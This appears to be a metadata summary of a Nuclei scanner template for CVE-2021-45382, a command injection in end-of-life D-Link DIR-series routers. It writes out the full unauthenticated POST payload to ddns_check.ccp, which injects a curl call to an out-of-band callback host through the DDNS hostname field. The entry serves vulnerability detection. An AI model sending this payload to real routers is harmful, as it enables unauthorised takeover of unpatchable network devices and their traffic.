---
cve_id: CVE-2021-45382
template_path: nuclei-templates/http/cves/2021/CVE-2021-45382.yaml
affected_product: D-Link DIR-810L, DIR-820L/LW, DIR-826L, DIR-830L, DIR-836L Routers
severity: critical
authentication: none
external_callback: true
affected_versions: All hardware revisions
preconditions: []
poc_classification: rce
---

## Vulnerability
A Remote Command Execution (RCE) vulnerability (CVE-2021-45382, CWE-78) exists in all hardware revisions of D-Link DIR-810L, DIR-820L/LW, DIR-826L, DIR-830L, and DIR-836L routers via command injection in the DDNS function of the ncc2 binary. Unauthenticated attackers can execute arbitrary system commands, leading to complete router compromise and control over network traffic. CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8). All listed models have reached EOL/EOS with no patches available.

## PoC / Detection
Classification: rce

The template sends a single unauthenticated POST request to `{{BaseURL}}/ddns_check.ccp` containing the body `ccp_act=doCheck&ddnsHostName=;curl https://{{interactsh-url}};&ddnsUsername={{string1}}&ddnsPassword={{string2}}` (random lowercase strings for username/password). It verifies success by matching an out-of-band HTTP callback to interactsh that includes the string "User-Agent: curl" in the incoming request.

## References
- https://nvd.nist.gov/vuln/detail/CVE-2021-45382
- https://supportannouncement.us.dlink.com/announcement/publication.aspx?name=SAP10264
- https://github.com/doudoudedi/D-LINK_Command_Injection1/blob/main/D-LINK_Command_injection.md#poc
- https://github.com/ARPSyndicate/cvemon
- https://github.com/Ostorlab/KEV
